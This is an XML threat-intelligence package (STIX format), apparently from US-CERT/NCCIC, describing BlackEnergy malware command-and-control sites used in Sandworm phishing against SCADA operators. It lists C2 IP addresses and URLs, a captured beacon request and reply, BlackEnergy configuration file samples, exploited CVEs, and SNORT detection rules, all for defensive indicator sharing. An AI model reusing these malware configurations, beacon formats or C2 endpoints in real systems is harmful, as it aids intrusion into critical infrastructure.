<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AIS="http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:simpleMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1" xmlns:stix-ciq="http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xal="urn:oasis:names:tc:ciq:xal:3" xmlns:xnl="urn:oasis:names:tc:ciq:xnl:3" xmlns:xpil="urn:oasis:names:tc:ciq:xpil:3" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-15-10100" timestamp="2015-03-13T18:29:39Z" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd   http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd   http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd   http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd   http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd   http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd   http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd   http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd   http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd   http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd   http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd   http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd   http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd   http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd   http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd   http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd   http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd   http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd   http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd      http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd   http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd     http://www.us-cert.gov/STIXMarkingStructure#AISConsentMarking-2 http://www.us-cert.gov/sites/default/files/STIX_Namespace/AIS_Bundle_Marking_1.1.1_v1.0.xsd     http://stix.mitre.org/extensions/Identity#CIQIdentity3.0-1 http://stix.mitre.org/XMLSchema/extensions/identity/ciq_3.0/1.1.1/ciq_3.0_identity.xsd     urn:oasis:names:tc:ciq:xpil:3 http://stix.mitre.org/XMLSchema/external/oasis_ciq_3.0/xPIL.xsd"><stix:STIX_Header><stix:Title>BlackEnergy Command and Control Sites Used Against SCADA Systems</stix:Title><stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Phishing</stix:Package_Intent><stix:Description>On 7 February 2015, command and control (C2) sites were identified in phishing campaigns against organizations that heavily use Supervisory Control and Data Acquisition (SCADA) systems. The malware was identified as BlackEnergy with three variants that called back to the following IP addresses:

95.143.193.131
37.220.34.56
144.76.119.48

This activity was tracked by one of the reporting sources as Sandworm Team.</stix:Description><stix:Handling><marking:Marking><marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure><marking:Marking_Structure xsi:type="AIS:AISMarkingStructure"><AIS:Not_Proprietary CISA_Proprietary="false"><AIS:AISConsent consent="EVERYONE"/><AIS:TLPMarking color="AMBER"/></AIS:Not_Proprietary></marking:Marking_Structure><marking:Information_Source><stixCommon:Identity xsi:type="stix-ciq:CIQIdentity3.0InstanceType"><stix-ciq:Specification><xpil:PartyName><xnl:OrganisationName><xnl:NameElement>NCCIC</xnl:NameElement></xnl:OrganisationName></xpil:PartyName><xpil:Addresses><xpil:Address><xal:Country><xal:NameElement xal:NameCode="US" xal:NameCodeType="ISO 3166-1 alpha-2"/></xal:Country><xal:AdministrativeArea><xal:NameElement xal:NameCode="US-DC" xal:NameCodeType="ISO 3166-2"/></xal:AdministrativeArea></xpil:Address></xpil:Addresses><xpil:OrganisationInfo xpil:IndustryType="Information Technology Sector"/></stix-ciq:Specification></stixCommon:Identity></marking:Information_Source></marking:Marking></stix:Handling><stix:Information_Source><stixCommon:Time><cyboxCommon:Produced_Time>2015-03-13T18:29:39Z</cyboxCommon:Produced_Time></stixCommon:Time></stix:Information_Source></stix:STIX_Header><stix:Indicators><stix:Indicator id="CISCP:indicator-d387c28a-7cd8-4c51-9e77-409190d785b7" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Composite_Indicator_Expression operator="OR"><indicator:Indicator idref="CISCP:indicator-4a72b6e7-ff1a-4288-84df-495dc94f9a68"/><indicator:Indicator idref="CISCP:indicator-95ce51c9-9b6a-452a-bcda-276a3259a779"/><indicator:Indicator idref="CISCP:indicator-8000b7bc-332a-4b10-8250-59362f825d7d"/></indicator:Composite_Indicator_Expression></stix:Indicator><stix:Indicator id="CISCP:indicator-4a72b6e7-ff1a-4288-84df-495dc94f9a68" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>According to an open-source Trend Micro report, the Sandworm Team used spear phishing emails with malicious attachments. The attachments included malicious documents containing exploits for one zero-day vulnerability, while other spear phishing email attachments could exploit two vulnerabilities.

Not relegated to office documents, the Sandworm Team also exploited vulnerabilities in WinRAR software and an Adobe Flash Player installer. Exploited vulnerabilities included CVE-2014-4114, CVE-2010-3333, CVE-2012-0158, CVE-2013-3906, CVE-2014-1761, and OSVDB-62610.

According to Trend Micro, the Russian-related activity referred to as Blacken targeted SCADA users of GE Intelligence Platform's CIMPLICITY Human-Machine Interface (HMI) Solution Suite. The attackers used .cim and .bcl files as exploitation vectors, but there was no evidence of actual manipulation of SCADA systems or devices.

(Source: http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/)

According to a third-party, the Sandworm attackers used tools that communicate over HTTP. Compromised machines called back to IP 95.143.193.131:

POST /aG91c2VhdHJIaWRIczk0/dirconf/check.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-us
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.2)
Accept-Encoding: gzip, deflate
Host: 95.143.193.131
Content-Length: 72
Connection: Keep-Alive
Cache-Control: no-cache
id=41997D5249BAC1ADFF28D6F30AC5FC2607BAA486&amp;bid=UHMwOU0=&amp;nm=1&amp;cn=2&amp;num=5
 
The callback site sent the following communications to the compromised machine:

HTTP/1.1 200 OK
Date: Thu, 04 Sep 2014 21:05:02 GMT
Server: Apache
X-Powered-By: PHP/5.3.3
Content-Length: 128
Connection: close
Content-Type: text/html; charset=UTF-8
0jhSzmPHQDqju0BBm89qh48pCLgLO1VW24Cfe34NHAb88zaK2qlDeFxcacprohi4uq1Ji8MEUPLsYin5FW007iHNVdtWT9C5NpVvgmlixIHhpTIp4PxliWKzyi3XXOI=
 
According to a third-party report, the Sandworm Team used at least two variants of the BlackEnergy Trojan appropriately dubbed BlackEnergy2 and BlackEnergy3. The variant BlackEnergy3 is also known as BlackEnergy Lite. Distinguished by its rootkit and plug-in architecture, BlackEnergy2 was observed in the wild since at least 2008. Many plug-ins were associated with BlackEnergy2 including spam, DDoS capability, and financial credential theft.</indicator:Description><indicator:Observable id="CISCP:Observable-dd90dfb0-b0c6-4d16-9241-c296c070c670"><cybox:Object id="CISCP:Object-de3c83e2-0124-423f-923d-a7cec2a7a222"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">http://95.143.193.131/aG91c2VhdHJIaWRIczk0/dirconf/check.php</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2015-02-12T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-95ce51c9-9b6a-452a-bcda-276a3259a779" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>The BlackEnergy2 variant can be identified by its use of a configuration file in the following format, along with the use of a kernel driver:

&lt;bkernel&gt;
&lt;servers&gt;
&lt;server&gt;
&lt;type&gt;https&lt;/type&gt;
&lt;addr&gt;https://37.220.34.56/siteproperties/viewframes/dialog.php&lt;/addr&gt;
&lt;/server&gt;
&lt;server&gt;
&lt;type&gt;gid&lt;/type&gt;
&lt;addr&gt;116769597454024178039&lt;/addr&gt;
&lt;/server&gt;
&lt;/servers&gt;
&lt;cmds&gt;
&lt;/cmds&gt;
&lt;sleepfreq&gt;600&lt;/sleepfreq&gt;
&lt;build_id&gt;0E0611peu&lt;/build_id&gt;
&lt;/bkernel&gt;

While the BlackEnergy3 malware does not have a rootkit, the Sandworm Team is known to use it. The malware is recognized by the following configuration file. Variables were denoted in [brackets]:

{"[C2 site]": "http://95.143.193.131/aG91c2VhdHJIaWRIczk0/dirconf/check.php," "[variable code]": "xVidRt," "[variable u1]": "," "sleep": "600," "u2": ""}</indicator:Description><indicator:Observable id="CISCP:Observable-1aacf177-004f-453b-9bc9-4f75d0631204"><cybox:Object id="CISCP:Object-953e9bfb-de40-42af-888c-5f684b3ccd93"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">https://37.220.34.56/siteproperties/viewframes/dialog.php</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2015-02-07T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="CISCP:indicator-8000b7bc-332a-4b10-8250-59362f825d7d" version="2.1.1" xsi:type="indicator:IndicatorType"><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>A potential third variant is similar to BlackEnergy2, differing primarily by the absence of XML in the configuration file:

https://144.76.119.48/YXJyYWtpczAy/loadvers/paramctrl.php;proxy=https=10.15.100.200:3128

According to Trend Micro, in order to target victims, the Sandworm Team uses spear phishing emails with malicious attachments. The attachments can include documents exploiting a zero-day vulnerability and other spear phishing emails that can exploit two vulnerabilities.  Not relegated to documents alone, Sandworm Team also leveraged a vulnerability in WinRAR software and an Adobe Flash Player installer. Exploited vulnerabilities included CVE-2014-4114, CVE-2010-3333, CVE-2012-0158, CVE-2013-3906, CVE-2014-1761 and OSVDB-62610.

According to Trend Micro, most research indicates the attackers targeted organizations who rely on SCADA systems, particularly GE Intelligence Platform's CIMPLICITY Human-Machine Interface (HMI) Solution Suite. Attackers used .cim and .bcl files as attack vectors; however, actual manipulation of SCADA systems or devices were not observed.

According to Trend Micro, the Sandworm Team primarily targeted near-abroad entities to include telecommunications and energy sectors, although the attackers could potentially use the BlackEnergy3 Trojan against other targets.

Sandworm-associated malware can be detected with the following SNORT rules:

alert tcp any any -&gt; any 80 (msg:"Sandworm Implant Beacon"; content:"=&amp;nm=1&amp;";pcre:"/id=[0-9A-Z]{40}&amp;bid=[a-zA-Z0-9]{5,8}&amp;nm=1&amp;cn=[0-9]&amp;num=[0-9]/";)
alert tcp any any -&gt; any 80 (msg:"Sandworm Implant Beacon Var 2"; content:"User-Agent: iexplorer8.0";)

For additional reporting regarding the SCADA targeting, see Trend Micro's 'Sandworm to Blacken: The SCADA Connection' Security Intelligence Blog [10/16/14] (http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/)</indicator:Description><indicator:Observable id="CISCP:Observable-b2581861-d079-4226-8fe5-4b01cf41f8d8"><cybox:Object id="CISCP:Object-835e2e74-f492-47a2-b88e-b8b052606530"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value condition="Equals">https://144.76.119.48/YXJyYWtpczAy/loadvers/paramctrl.php</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2015-02-07T00:00:00"/></indicator:Sightings></stix:Indicator></stix:Indicators><stix:TTPs><stix:Kill_Chains><stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf"><stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/><stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/><stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/><stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/><stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/><stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/><stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/></stixCommon:Kill_Chain></stix:Kill_Chains></stix:TTPs></stix:STIX_Package>